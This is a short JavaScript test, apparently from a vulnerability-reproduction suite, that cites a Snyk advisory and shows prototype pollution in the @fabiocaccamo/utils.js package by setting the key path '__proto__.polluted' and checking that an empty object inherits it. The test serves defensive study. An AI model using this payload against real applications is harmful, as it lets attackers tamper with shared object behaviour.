//https://security.snyk.io/vuln/SNYK-JS-FABIOCACCAMOUTILSJS-1932614
test("prototype pollution in @fabiocaccamo/utils.js", () => {
  const utils = require("@fabiocaccamo/utils.js");
  const obj = {};

  expect({}.polluted).toBe(undefined);

  utils.object.keypath.set(obj, "__proto__.polluted", "yes");
  expect({}.polluted).toBe("yes");
});
